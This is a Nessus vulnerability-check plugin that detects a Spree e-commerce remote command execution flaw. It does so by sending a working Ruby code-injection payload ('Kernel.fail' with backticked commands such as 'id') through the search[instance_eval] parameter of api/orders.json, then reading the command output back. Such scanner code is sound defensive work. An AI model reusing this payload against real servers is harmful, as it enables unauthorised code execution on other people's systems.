#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(53633);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_bugtraq_id(47543);
  script_osvdb_id(71900);
  script_xref(name:"EDB-ID", value:"17199");

  script_name(english:"Spreecommerce api/orders.json Search Function Arbitrary Command Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that allows arbitrary
command execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts Spree, an open source e-commerce
application for Ruby on Rails.

The version of this application installed on the remote host has a
flaw in the third-party 'rd_searchlogic' Ruby gem. An
unauthenticated, remote attacker can inject arbitrary Ruby code via the
'search[instance_eval]' parameter of the 'api/orders.json' script to
be executed on the remote host subject to the privileges under which
the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.spreecommerce.com/blog/2011/04/19/security-fixes");
  script_set_attribute(attribute:"solution", value:"Upgrade to Spree version 0.50.x or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Spreecommerce Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

script_set_attribute(attribute:"vuln_publication_date", value:"2011/04/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/04/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);


os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/spree", "/store", cgi_dirs()));
else dirs = make_list(cgi_dirs());

disable_cookiejar();
found_cmd = "";
output = "";
installs = 0;
vuln_req = "";
vuln_urls = make_list();

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  foreach cmd (cmds)
  {
    # Once we find a command that works, stick with it for any subsequent tests.
    if (found_cmd && cmd != found_cmd) continue;

    exploit = 'Kernel.fail `'+cmd+'`';

    url = dir + '/api/orders.json?' +
      'search[instance_eval]=' + urlencode(str:exploit);

    res = http_send_recv3(
      port         : port,
      method       : "GET",
      item         : url,
      add_headers  : make_array("HTTP_AUTHORIZATION", "ABCD"),
      exit_on_fail : TRUE
    );
    if (!res[2]) continue;

    # If the output looks like it's from the script...
    if (
      (
        '<title>Action Controller' >< res[2] &&
        'in Api/ordersController' >< res[2]
      ) ||
      'Powered by <a href="http://spreecommerce.com/">Spree</a>' >< res[2] ||
      (
        'meta name="csrf-param" content="authenticity_token"/>' >< res[2] &&
        '<select id="taxon" name="taxon"><option value="">All departments</option>' >< res[2]
      )
    )
    {
      installs++;
    }
    # otherwise continue unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      continue;
    }

    if (egrep(pattern:cmd_pats[cmd], string:res[2]))
    {
      vuln_urls = make_list(vuln_urls, dir+'/');
      if (!vuln_req) vuln_req = http_last_sent_request();
      if (!output)
      {
        found_cmd = cmd;
        output = strstr(res[2], "<pre>(eval):1:in `send': ") - "<pre>(eval):1:in `send': ";
        output = output - strstr(output, "</pre>");
        if (!egrep(pattern:cmd_pats[cmd], string:output)) output = "";
      }
      break;
    }
  }
  if (output && !thorough_tests) break;
}

if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';
    header =
      "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
      'host using the following Spree install' + s;

    trailer = 'by sending a request such as :' +
      '\n' +
      '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
      '\n' + chomp(vuln_req) +
      '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1)
    {
      trailer +=
        '\n' +
        'This produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        chomp(output) + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
{
  if (installs == 0) exit(0, "No installs of Spree were found on the web server on port "+port+".");
  else if (installs == 1) exit(0, "The Spree install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The Spree installs hosted on the web server on port "+port+" are not affected.");
}
